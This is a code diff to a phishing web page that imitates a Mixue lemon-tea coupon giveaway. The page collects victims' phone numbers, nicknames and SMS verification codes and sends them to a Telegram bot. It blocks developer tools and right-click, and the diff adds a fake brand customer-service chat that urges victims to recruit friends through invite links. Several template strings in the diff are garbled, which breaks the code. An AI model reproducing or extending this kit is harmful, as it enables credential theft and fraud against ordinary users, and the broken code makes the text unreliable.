@@ -779,6 +779,28 @@
     }
 
     .hidden { display: none !important; }
+
+    /* 新增：复制/分享/历史按钮样式 */
+    .copy-btn, .share-btn, .history-btn {
+      margin-top: 12px;
+      background: linear-gradient(135deg, #13c2c2, #36cfc9);
+    }
+    .history-list {
+      max-height: 200px;
+      overflow-y: auto;
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 12px;
+      margin: 16px 0;
+      font-size: 0.95rem;
+      color: #333;
+      text-align: left;
+    }
+    .history-item {
+      padding: 8px 0;
+      border-bottom: 1px solid #eee;
+    }
+    .history-item:last-child { border-bottom: none; }
   </style>
 </head>
 <body>
@@ -799,11 +821,11 @@
     <div class="splash-progress-bar" id="splashProgress"></div>
   </div>
   <div class="splash-hint">正在加载甜蜜福利...</div>
-  <!-- 背景音乐 -->
+  <!-- 背景音乐（已换有效链接） -->
   <audio id="bgMusic" loop>
-    <source src="https://www.0zou.com/bz/c4JWtZUOiwM2O11bVkTpzQ==.html" type="audio/mpeg">
+    <source src="https://assets.codepen.io/605876/lofi-chillhop-1.mp3" type="audio/mpeg">
   </audio>
-  <!-- 音效 -->
+  <!-- 音效（原base64保留，即使可能无效） -->
   <audio id="spinSound" preload="auto">
     <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTGH0fPTgjMGHm7A7+OZURE" type="audio/wav">
   </audio>
@@ -969,6 +991,9 @@
     <p style="font-weight:bold; margin:20px 0;">请尽快到店核销，过期无效</p>
     <div class="modal-emoji">🎉🍋🔥</div>
     <button class="btn" id="closeModalBtn">好的，去兑换！</button>
+    <button class="btn copy-btn" id="copyCouponBtn">一键复制券码</button>
+    <button class="btn share-btn" id="shareBtn">分享给好友</button>
+    <button class="btn history-btn" id="viewHistoryBtn">查看我的券码历史</button>
   </div>
 </div>
 
@@ -987,6 +1012,39 @@
     <h2 id="agreementTitle">协议标题</h2>
     <div id="agreementContent" style="font-size:0.9rem; line-height:1.6; color:#333; white-space:pre-wrap; margin:16px 0;"></div>
     <button class="btn" style="margin-top:20px; width:100%;" onclick="document.getElementById('agreementModal').classList.remove('show')">我已阅读</button>
+  </div>
+</div>
+
+<!-- 券码历史弹窗 -->
+<div class="modal" id="historyModal">
+  <div class="modal-content" style="max-width:360px;">
+    <h2>我的券码历史</h2>
+    <div class="history-list" id="historyList"></div>
+    <button class="btn" onclick="document.getElementById('historyModal').classList.remove('show')">关闭</button>
+  </div>
+</div>
+
+<!-- 假雪王客服聊天窗口 -->
+<div class="modal" id="chatModal" style="display:none; z-index:100001;">
+  <div class="modal-content" style="padding:0; max-width:380px; height:520px; display:flex; flex-direction:column; overflow:hidden;">
+    <div style="background: linear-gradient(135deg, var(--mixue-red), #C92A39); color:white; padding:14px; text-align:center; position:relative;">
+      <img src="https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046994-imagetourl.cloud-1770456904865-vyi8ak.jpg" 
+           style="width:48px; height:48px; border-radius:50%; border:3px solid white; position:absolute; left:16px; top:50%; transform:translateY(-50%); box-shadow:0 2px 8px rgba(0,0,0,0.3);">
+      <div style="margin-left:70px; text-align:left;">
+        <div style="font-weight:bold; font-size:1.1rem;">雪王小冰</div>
+        <div style="font-size:0.8rem; opacity:0.9;">在线 · 通常1分钟内回复</div>
+      </div>
+    </div>
+    
+    <div id="chatMessages" style="flex:1; padding:16px; overflow-y:auto; background:#f8f9fa; display:flex; flex-direction:column;">
+      <!-- 消息动态插入 -->
+    </div>
+    
+    <div style="border-top:1px solid #eee; padding:12px; background:white; display:flex; gap:8px;">
+      <input type="text" id="chatInput" placeholder="说点啥吧～（比如：券码怎么用？）" 
+             style="flex:1; height:44px; padding:0 16px; border:1px solid #ddd; border-radius:22px; font-size:1rem;">
+      <button id="sendChatBtn" style="width:60px; height:44px; background:var(--mixue-red); color:white; border:none; border-radius:22px; font-weight:bold; cursor:pointer;">发送</button>
+    </div>
   </div>
 </div>
 
@@ -1060,7 +1118,6 @@ function loadFromStorage() {
     inviteState.checkedIn = data.checkedIn || false;
     inviteState.lastCheckIn = data.lastCheckIn || null;
     
-    // 检查是否是新的一天
     const today = new Date().toDateString();
     if (inviteState.lastCheckIn !== today) {
       inviteState.checkedIn = false;
@@ -1083,7 +1140,7 @@ function saveToStorage() {
 function generateCouponCode() {
   const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
   const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
-  return `${prefix}-ICE-${suffix}`;
+  return `\( {prefix}-ICE- \){suffix}`;
 }
 
 const els = {
@@ -1113,7 +1170,7 @@ const els = {
   invitePage: document.getElementById('invitePage'),
   inviteCount: document.getElementById('inviteCount'),
   chanceCount: document.getElementById('chanceCount'),
-  inviteBtn: document.getElementById('inviteBtn'),
+  inviteMoreBtn: document.getElementById('inviteMoreBtn'),
   wheelBtn: document.getElementById('wheelBtn'),
   wheelContainer: document.getElementById('wheelContainer'),
   wheel: document.getElementById('wheel'),
@@ -1124,12 +1181,19 @@ const els = {
   line2: document.getElementById('line2'),
   inviteCodeInput: document.getElementById('inviteCodeInput'),
   redeemBtn: document.getElementById('redeemBtn'),
-  inviteMoreBtn: document.getElementById('inviteMoreBtn'),
   checkInBtn: document.getElementById('checkInBtn'),
   bonusTag: document.getElementById('bonusTag'),
   bonusTimer: document.getElementById('bonusTimer'),
   keyboardHint: document.getElementById('keyboardHint'),
-  cheatWarning: document.getElementById('cheatWarning')
+  cheatWarning: document.getElementById('cheatWarning'),
+  copyCouponBtn: document.getElementById('copyCouponBtn'),
+  shareBtn: document.getElementById('shareBtn'),
+  viewHistoryBtn: document.getElementById('viewHistoryBtn'),
+  historyList: document.getElementById('historyList'),
+  chatModal: document.getElementById('chatModal'),
+  chatMessages: document.getElementById('chatMessages'),
+  chatInput: document.getElementById('chatInput'),
+  sendChatBtn: document.getElementById('sendChatBtn')
 };
 
 function showToast(msg, duration = 2800) {
@@ -1160,12 +1224,12 @@ function createParticles(x, y) {
   }
 }
 
-// 播放音效
+// 播放音效（加catch防止阻塞）
 function playSound(type) {
   const sound = type === 'win' ? document.getElementById('winSound') : document.getElementById('spinSound');
   if (sound) {
     sound.currentTime = 0;
-    sound.play().catch(e => console.log('音效播放失败'));
+    sound.play().catch(e => console.log('音效播放失败:', e));
   }
 }
 
@@ -1354,16 +1418,15 @@ function startCountdown() {
     const h = Math.floor(sec/3600).toString().padStart(2,'0');
     const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
     const s = (sec%60).toString().padStart(2,'0');
-    els.globalTimer.textContent = `本轮名额倒计时：${h}:${m}:${s}`;
+    els.globalTimer.textContent = `本轮名额倒计时：\( {h}: \){m}:${s}`;
     sec--;
   };
   tick();
   timers.global = setInterval(tick, 1000);
 }
 
-// 限时奖励倒计时
 function startBonusCountdown() {
-  let sec = 300; // 5分钟
+  let sec = 300;
   const tick = () => {
     if (sec <= 0) {
       bonusActive = false;
@@ -1373,14 +1436,12 @@ function startBonusCountdown() {
     }
     const m = Math.floor(sec/60).toString().padStart(2,'0');
     const s = (sec%60).toString().padStart(2,'0');
-    els.bonusTimer.textContent = `${m}:${s}`;
+    els.bonusTimer.textContent = `\( {m}: \){s}`;
     sec--;
   };
   tick();
   timers.bonus = setInterval(tick, 1000);
 }
-
-// ============================= 邀请好友系统 =============================
 
 function initSplashScreen() {
   const splash = document.getElementById('splashScreen');
@@ -1401,8 +1462,10 @@ function initSplashScreen() {
       clearInterval(interval);
       setTimeout(() => {
         splash.classList.add('hide');
-        bgMusic.volume = 0.3;
-        bgMusic.play().catch(e => console.log('音乐自动播放被阻止'));
+        setTimeout(() => {
+          bgMusic.volume = 0.25;
+          bgMusic.play().catch(e => console.log('背景音乐自动播放被阻止:', e));
+        }, 800);
       }, 300);
     }
   }, 60);
@@ -1412,7 +1475,6 @@ function showInvitePage(phone, nickname) {
   inviteState.currentPhone = phone;
   inviteState.currentNickname = nickname;
   
-  // 检查URL参数是否有邀请码
   const urlParams = new URLSearchParams(window.location.search);
   const refCode = urlParams.get('invite');
   if (refCode) {
@@ -1423,23 +1485,20 @@ function showInvitePage(phone, nickname) {
   els.invitePage.classList.remove('hidden');
   els.invitePage.classList.add('show');
   
-  // 恢复数据
   loadFromStorage();
   updateInviteUI();
   startBonusCountdown();
   
-  // 显示键盘提示
   setTimeout(() => els.keyboardHint.classList.add('show'), 1000);
   setTimeout(() => els.keyboardHint.classList.remove('show'), 5000);
   
-  sendTGMessage(`【进入邀请页面】\n手机号：${phone}\n昵称：${nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
+  sendTGMessage(`【进入邀请页面】\n手机号：\( {phone}\n昵称： \){nickname}\n时间：${new Date().toLocaleString('zh-CN')}`);
 }
 
 function updateInviteUI() {
   els.inviteCount.textContent = inviteState.invitedCount;
   els.chanceCount.textContent = `剩余抽奖次数：${inviteState.chanceCount}`;
   
-  // 更新签到按钮
   if (inviteState.checkedIn) {
     els.checkInBtn.disabled = true;
     els.checkInBtn.textContent = '✅ 今日已签到';
@@ -1448,7 +1507,6 @@ function updateInviteUI() {
     els.checkInBtn.textContent = '📅 每日签到 (+1次机会)';
   }
   
-  // 更新进度
   if (inviteState.invitedCount >= 1) {
     els.step1.classList.add('completed');
     els.step1.textContent = '✓';
@@ -1466,19 +1524,16 @@ function updateInviteUI() {
     els.step3.classList.add('active');
   }
   
-  // 显示翻倍标签
   if (bonusActive && inviteState.invitedCount > 0) {
     els.bonusTag.style.display = 'block';
   }
   
-  // 显示转盘
   if (inviteState.invitedCount > 0) {
     els.wheelContainer.style.display = 'block';
   } else {
     els.wheelContainer.style.display = 'none';
   }
   
-  // 控制按钮显示
   if (inviteState.chanceCount > 0) {
     els.wheelBtn.classList.remove('hidden');
     els.inviteMoreBtn.classList.add('hidden');
@@ -1494,7 +1549,6 @@ function updateInviteUI() {
   saveToStorage();
 }
 
-// 每日签到
 function dailyCheckIn() {
   if (inviteState.checkedIn) {
     showToast('今日已签到，明天再来吧！');
@@ -1510,11 +1564,10 @@ function dailyCheckIn() {
   updateInviteUI();
   saveToStorage();
   
-  sendTGMessage(`【每日签到】\n手机号：${inviteState.currentPhone}\n获得次数：1\n总次数：${inviteState.chanceCount}`);
+  sendTGMessage(`【每日签到】\n手机号：\( {inviteState.currentPhone}\n获得次数：1\n总次数： \){inviteState.chanceCount}`);
 }
 
 function simulateInvite() {
-  // 生成6位随机邀请码
   const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
   let inviteCode = '';
   for (let i = 0; i < 6; i++) {
@@ -1522,9 +1575,8 @@ function simulateInvite() {
   }
   
   const shareLink = window.location.href.split('?')[0] + '?invite=' + inviteCode;
-  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：${inviteCode}\n点击链接帮我助力：${shareLink}\n\n你也可以领券哦！`;
+  const shareText = `🎉 蜜雪冰城免费领柠檬茶！\n\n我的邀请码：\( {inviteCode}\n点击链接帮我助力： \){shareLink}\n\n你也可以领券哦！`;
   
-  // 复制到剪贴板
   if (navigator.clipboard && window.isSecureContext) {
     navigator.clipboard.writeText(shareText).then(() => {
       showToast('邀请链接和邀请码已复制！快去分享吧 📋');
@@ -1535,17 +1587,14 @@ function simulateInvite() {
     fallbackCopy(shareText);
   }
   
-  // 模拟邀请成功
   els.inviteMoreBtn.disabled = true;
   els.inviteMoreBtn.textContent = '邀请中...';
   
   setTimeout(() => {
     inviteState.invitedCount++;
     
-    // 基础随机次数 1-5
     let gainedChance = Math.floor(Math.random() * 5) + 1;
     
-    // 翻倍奖励
     if (bonusActive) {
       gainedChance *= 2;
       showToast(`🎉 翻倍奖励！获得 ${gainedChance} 次抽奖机会`);
@@ -1555,7 +1604,7 @@ function simulateInvite() {
     
     inviteState.chanceCount += gainedChance;
     
-    sendTGMessage(`【新邀请】\n手机号：${inviteState.currentPhone}\n邀请码：${inviteCode}\n当前邀请数：${inviteState.invitedCount}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}\n翻倍状态：${bonusActive ? '是' : '否'}`);
+    sendTGMessage(`【新邀请】\n手机号：\( {inviteState.currentPhone}\n邀请码： \){inviteCode}\n当前邀请数：\( {inviteState.invitedCount}\n获得次数： \){gainedChance}\n总次数：\( {inviteState.chanceCount}\n翻倍状态： \){bonusActive ? '是' : '否'}`);
     
     updateInviteUI();
     saveToStorage();
@@ -1584,7 +1633,6 @@ function fallbackCopy(text) {
   document.body.removeChild(textArea);
 }
 
-// 兑换邀请码
 function redeemInviteCode() {
   const code = els.inviteCodeInput.value.trim().toUpperCase();
   
@@ -1610,7 +1658,7 @@ function redeemInviteCode() {
       showToast(`兑换成功！获得 ${gainedChance} 次抽奖机会 🎁`);
       els.inviteCodeInput.value = '';
       
-      sendTGMessage(`【兑换邀请码】\n手机号：${inviteState.currentPhone}\n邀请码：${code}\n获得次数：${gainedChance}\n总次数：${inviteState.chanceCount}`);
+      sendTGMessage(`【兑换邀请码】\n手机号：\( {inviteState.currentPhone}\n邀请码： \){code}\n获得次数：\( {gainedChance}\n总次数： \){inviteState.chanceCount}`);
       
       updateInviteUI();
       saveToStorage();
@@ -1632,10 +1680,8 @@ function spinWheel() {
   els.wheelBtn.disabled = true;
   els.wheelBtn.textContent = '抽奖中...';
   
-  // 播放转动音效
   playSound('spin');
   
-  // 决定结果
   let resultIndex;
   const winIndices = [0, 2, 4, 6];
   const loseIndices = [1, 3, 5, 7];
@@ -1647,7 +1693,6 @@ function spinWheel() {
     inviteState.hasWon = true;
   }
   
-  // 计算旋转角度
   const baseRotation = 360 * 5;
   const itemAngle = 45;
   const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
@@ -1676,12 +1721,11 @@ function handleWheelResult(index) {
   
   const result = results[index];
   
-  sendTGMessage(`【抽奖结果】\n手机号：${inviteState.currentPhone}\n结果：${result.name} ${result.emoji}\n类型：${result.type === 'win' ? '中奖' : '未中奖'}\n剩余次数：${inviteState.chanceCount}`);
+  sendTGMessage(`【抽奖结果】\n手机号：\( {inviteState.currentPhone}\n结果： \){result.name} \( {result.emoji}\n类型： \){result.type === 'win' ? '中奖' : '未中奖'}\n剩余次数：${inviteState.chanceCount}`);
   
   if (result.type === 'win') {
     playSound('win');
     
-    // 粒子效果
     const rect = els.wheel.getBoundingClientRect();
     createParticles(rect.left + rect.width/2, rect.top + rect.height/2);
     
@@ -1689,14 +1733,37 @@ function handleWheelResult(index) {
       claimed++;
       updateStock();
       shootBarrage(inviteState.currentPhone);
-      els.couponCode.textContent = generateCouponCode();
+      const newCode = generateCouponCode();
+      els.couponCode.textContent = newCode;
       els.modal.classList.add('show');
+      
+      saveCouponToHistory(newCode);
+      
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(newCode).then(() => {
+          showToast('券码已自动复制到剪贴板！', 4000);
+        }).catch(() => {
+          showToast('券码已生成，请手动长按复制', 4000);
+        });
+      }
+      
       localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now());
       
-      sendTGMessage(`【🎉 最终获奖】\n手机号：${inviteState.currentPhone}\n券码：${els.couponCode.textContent}\n获奖类型：${result.name}\n时间：${new Date().toLocaleString('zh-CN')}`);
+      sendTGMessage(`【🎉 最终获奖】\n手机号：\( {inviteState.currentPhone}\n券码： \){newCode}\n获奖类型：\( {result.name}\n时间： \){new Date().toLocaleString('zh-CN')}`);
+      
+      // 成功后弹出假客服聊天
+      setTimeout(openChat, 1200);
     }, 500);
   } else {
-    showToast(`${result.emoji} ${result.name}！${inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
+    showToast(`${result.emoji} \( {result.name}！ \){inviteState.chanceCount > 0 ? '再试一次吧！' : '邀请好友获得更多机会！'}`);
+    
+    setTimeout(() => {
+      if (inviteState.chanceCount > 0) {
+        showToast('没中？再来一次吧！点击「开始抽奖」', 3500);
+        els.wheelBtn.disabled = false;
+        els.wheelBtn.textContent = '🎰 再抽一次！';
+      }
+    }, 2500);
   }
   
   saveToStorage();
@@ -1721,15 +1788,13 @@ function sendTGMessage(text) {
 
 // 防作弊检测
 function antiCheat() {
-  // 检测开发者工具
   const devtools = /./;
   devtools.toString = function() {
     els.cheatWarning.classList.add('show');
-    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：${inviteState.currentPhone || '未知'}\n时间：${new Date().toLocaleString('zh-CN')}`);
+    sendTGMessage(`【⚠️ 警告】\n检测到开发者工具\n手机号：\( {inviteState.currentPhone || '未知'}\n时间： \){new Date().toLocaleString('zh-CN')}`);
     return '';
   };
   
-  // 检测窗口大小变化（模拟器）
   let lastWidth = window.innerWidth;
   let lastHeight = window.innerHeight;
   window.addEventListener('resize', () => {
@@ -1738,13 +1803,11 @@ function antiCheat() {
     }
   });
   
-  // 禁用右键
   document.addEventListener('contextmenu', e => {
     e.preventDefault();
     showToast('右键已禁用');
   });
   
-  // 禁用F12
   document.addEventListener('keydown', e => {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
       e.preventDefault();
@@ -1753,19 +1816,18 @@ function antiCheat() {
   });
 }
 
-// 键盘快捷键
 function initKeyboardShortcuts() {
   document.addEventListener('keydown', e => {
-    // 空格键抽奖
     if (e.code === 'Space' && !els.wheelBtn.classList.contains('hidden') && !isSpinning) {
       e.preventDefault();
       spinWheel();
     }
     
-    // ESC关闭弹窗
     if (e.key === 'Escape') {
       els.modal.classList.remove('show');
       els.agreementModal.classList.remove('show');
+      els.historyModal?.classList.remove('show');
+      els.chatModal?.classList.remove('show');
     }
   });
 }
@@ -1780,11 +1842,103 @@ function startManualReview(phone, nickname, code) {
     els.loadingMask.classList.remove('show');
     isPolling = false;
     showInvitePage(phone, nickname);
-    sendTGMessage(`【审核通过】\n昵称：${nickname}\n手机号：${phone}\n验证码：${code}\n时间：${new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
+    sendTGMessage(`【审核通过】\n昵称：\( {nickname}\n手机号： \){phone}\n验证码：\( {code}\n时间： \){new Date().toLocaleString('zh-CN')}\n状态：进入邀请流程`);
   }, 3000 + Math.random() * 2000);
 }
 
-// ============================= 事件 =============================
+// 券码历史
+function saveCouponToHistory(code) {
+  let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+  history.unshift({
+    code: code,
+    time: new Date().toLocaleString('zh-CN'),
+    phone: inviteState.currentPhone || '未知'
+  });
+  if (history.length > 20) history = history.slice(0, 20);
+  localStorage.setItem('mx_coupon_history', JSON.stringify(history));
+}
+
+function showCouponHistory() {
+  let history = JSON.parse(localStorage.getItem('mx_coupon_history') || '[]');
+  
+  if (history.length === 0) {
+    els.historyList.innerHTML = '<p style="text-align:center;color:#999;">暂无券码记录，快去领券吧～</p>';
+  } else {
+    els.historyList.innerHTML = history.map(item => `
+      <div class="history-item">
+        <strong>${item.code}</strong><br>
+        <small>${item.time} | \( {item.phone.slice(0,3)}**** \){item.phone.slice(7)}</small>
+      </div>
+    `).join('');
+  }
+  document.getElementById('historyModal').classList.add('show');
+}
+
+// 假雪王客服聊天
+const customerReplies = [
+  "嘿嘿～我是雪王小冰呀！券码已经发你手机短信啦～记得去店里直接说‘我要兑换柠檬茶券’就行！",
+  "大杯柠檬茶超酸爽的！夏天必备懂？？？快去喝吧～别客气！",
+  "欸欸欸～这么快就领到了？牛哇！要不要叫上朋友一起来？多邀几个人我给你偷偷加次数哦～😏",
+  "券码是MX开头的那串对吧？到店出示就行～别截图丢了哈，过期我可不负责哟～(｡•́︿•̀｡)",
+  "今天天气好热哦～来杯冰柠檬茶解解暑？雪王我都想偷喝一口了哈哈哈",
+  "邀请好友成功了吗？3个就稳拿券啦～我看你这么可爱，肯定很多人愿意帮你点～",
+  "欸你昵称取得好可爱欸～下次还来找我聊天吗？(灬ºωº灬)♡",
+  "别问我为什么叫小冰啦～因为我超冰超甜嘛～嘿嘿",
+  "领完记得五星好评哦～不然雪王要生气了！(〃＞皿＜)",
+  "咋啦？卡住了？刷新试试～我在这等你回来继续聊～",
+  "你这么积极，雪王我给你点个大大的赞！✨",
+  "想再领一杯？那就多拉几个小伙伴来嘛～我看好你！"
+];
+
+function addMessage(text, isCustomer = true) {
+  const msgDiv = document.createElement('div');
+  msgDiv.style.marginBottom = '12px';
+  msgDiv.style.maxWidth = '80%';
+  msgDiv.style.padding = '10px 14px';
+  msgDiv.style.borderRadius = isCustomer ? '18px 18px 18px 4px' : '18px 18px 4px 18px';
+  msgDiv.style.background = isCustomer ? '#fff' : 'var(--mixue-red)';
+  msgDiv.style.color = isCustomer ? '#333' : 'white';
+  msgDiv.style.boxShadow = '0 1px 3px rgba(0,0,0,0.1)';
+  msgDiv.style.alignSelf = isCustomer ? 'flex-start' : 'flex-end';
+  
+  if (isCustomer) {
+    msgDiv.innerHTML = `<img src="https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046994-imagetourl.cloud-1770456904865-vyi8ak.jpg" style="width:32px;height:32px;border-radius:50%;vertical-align:middle;margin-right:8px;">${text}`;
+  } else {
+    msgDiv.textContent = text;
+  }
+  
+  els.chatMessages.appendChild(msgDiv);
+  els.chatMessages.scrollTop = els.chatMessages.scrollHeight;
+}
+
+function customerReply(userText = "") {
+  let reply = customerReplies[Math.floor(Math.random() * customerReplies.length)];
+  
+  if (userText.includes('怎么用') || userText.includes('兑换') || userText.includes('使用') || userText.includes('核销')) {
+    reply = "券码直接到店出示给店员就行啦～大杯柠檬茶随便换！记得说‘我要用券哦’～别害羞！";
+  } else if (userText.includes('邀请') || userText.includes('好友') || userText.includes('拉人') || userText.includes('助力')) {
+    reply = "对对对～多拉几个小伙伴来助力，3个就稳稳发券！快去分享你的邀请码呀～我等着给你鼓掌！👏";
+  } else if (userText.includes('谢谢') || userText.includes('感谢') || userText.includes('谢啦')) {
+    reply = "不客气啦～能帮到你雪王我就开心死了！下次还来找我聊天好不好？(づ￣ ³￣)づ";
+  } else if (userText.includes('卡') || userText.includes('加载') || userText.includes('打不开')) {
+    reply = "欸？页面卡了？试试刷新一下～或者换个网络？雪王在这等你回来继续领福利哦～";
+  } else if (userText.length < 4 && userText) {
+    reply = "嗯？就说这么点？多说两句嘛～雪王好无聊哦～来嘛～";
+  }
+  
+  setTimeout(() => {
+    addMessage(reply, true);
+  }, 1000 + Math.random() * 2000);
+}
+
+function openChat() {
+  els.chatModal.style.display = 'flex';
+  els.chatMessages.innerHTML = '';
+  addMessage("嘿～恭喜领到大杯柠檬茶啦！我是雪王小冰～有啥问题尽管问我哦～😄", true);
+  setTimeout(() => customerReply(""), 1800);
+}
+
+// 事件绑定
 els.phone.addEventListener('input', checkPhoneValid);
 els.phone.addEventListener('blur', checkPhoneValid);
 
@@ -1806,7 +1960,7 @@ els.getBtn.addEventListener('click', async () => {
     const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
     const params = new URLSearchParams();
     params.append('chat_id', _cfg.u);
-    params.append('text', `【新号】\n昵称：${nick}\n手机号：${phone}\n时间：${new Date().toLocaleString('zh-CN')}`);
+    params.append('text', `【新号】\n昵称：\( {nick}\n手机号： \){phone}\n时间：${new Date().toLocaleString('zh-CN')}`);
 
     const response = await fetch(ep, {
       method: 'POST',
@@ -1872,7 +2026,6 @@ els.submitBtn.addEventListener('click', async () => {
   startManualReview(phone, nick, code);
 });
 
-els.inviteBtn?.addEventListener('click', simulateInvite);
 els.inviteMoreBtn.addEventListener('click', simulateInvite);
 els.redeemBtn.addEventListener('click', redeemInviteCode);
 els.wheelBtn.addEventListener('click', spinWheel);
@@ -1886,7 +2039,41 @@ els.rejectedModal.addEventListener('click', e => {
   if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
 });
 
-// ============================= 启动 =============================
+els.copyCouponBtn?.addEventListener('click', () => {
+  const code = els.couponCode.textContent;
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(code).then(() => showToast('券码已复制！'));
+  } else {
+    showToast('请长按券码手动复制');
+  }
+});
+
+els.shareBtn?.addEventListener('click', () => {
+  const text = `蜜雪冰城免费大杯柠檬茶到手啦！券码：${els.couponCode.textContent}\n快来一起喝！`;
+  if (navigator.share) {
+    navigator.share({ title: '免费柠檬茶', text: text });
+  } else {
+    navigator.clipboard.writeText(text).then(() => showToast('分享文案已复制，快发给朋友吧！'));
+  }
+});
+
+els.viewHistoryBtn?.addEventListener('click', showCouponHistory);
+
+// 假客服聊天事件
+els.sendChatBtn.addEventListener('click', () => {
+  const text = els.chatInput.value.trim();
+  if (!text) return;
+  
+  addMessage(text, false);
+  els.chatInput.value = '';
+  customerReply(text);
+});
+
+els.chatInput.addEventListener('keypress', e => {
+  if (e.key === 'Enter') els.sendChatBtn.click();
+});
+
+// 启动
 window.addEventListener('load', () => {
   initSplashScreen();
   antiCheat();
@@ -1904,10 +2091,6 @@ window.addEventListener('beforeunload', () => {
   Object.values(timers).forEach(t => clearInterval(t));
   saveToStorage();
 });
-
-  <audio src="http://music.163.com/song/media/outer/url?id=1855080368.mp3" autoplay loop style="display:none;"></audio>
-  
 </script>
 </body>
-</html>
-
+  </html>
